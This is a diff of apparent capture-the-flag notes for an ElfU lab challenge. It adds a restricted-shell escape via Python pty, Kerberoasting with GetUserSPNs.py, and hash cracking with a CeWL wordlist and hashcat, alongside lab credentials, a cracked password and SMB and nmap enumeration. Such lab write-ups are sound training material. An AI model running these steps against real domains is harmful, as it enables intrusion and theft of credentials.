@@ -13,15 +13,32 @@ Eve Snowshoe will give you a hint after you finish the HoHoNo Fail2Ban challenge
 It returns access creds:
 New Student Domain Account Creation Successful!
 You can now access the student network grading system by SSH'ing into this asset using the command below:
-ssh iuiqfqxwoj@grades.elfu.org -p 2222
-ElfU Domain Username: iuiqfqxwoj
-ElfU Domain Password: Cdcmiwbly#
+ssh knuefahyyw@grades.elfu.org -p 2222
+ElfU Domain Username: knuefahyyw
+ElfU Domain Password: Sxdenyfaj#
 
+### Shell escape
 After SSHing in, run ctl d to escape into python, then get a tty interactive shell:
 
 import pty;pty.spawn('/bin/bash')
 
+### Kerberoasting
+python3 GetUserSPNs.py elfu.local/knuefahyyw:Sxdenyfaj# -outputfile out.txt
+
+### Hash Cracking
+```
+git clone https://github.com/digininja/CeWL.git
+docker build -t cewl .
+docker run -it --rm -v "${PWD}:/host" cewl -w out.txt --with-numbers https://register.elfu.org/register
+./hashcat/hashcat -m 13100 hash.txt CeWL/out.txt --rules OneRuleToRuleThemAll.rule
+echo "Snow2021!"
+```
+
+
+
+
 `nmblookup -A 172.17.0.4`
 `smbclient -L \\iuiqfqxwoj -I 172.17.0.4 -N`
 
-`nmap 10.128.3.30 -sV -sC > dc.txt`
+nmap 10.128.3.30 -sV -sC > dc.txt
+
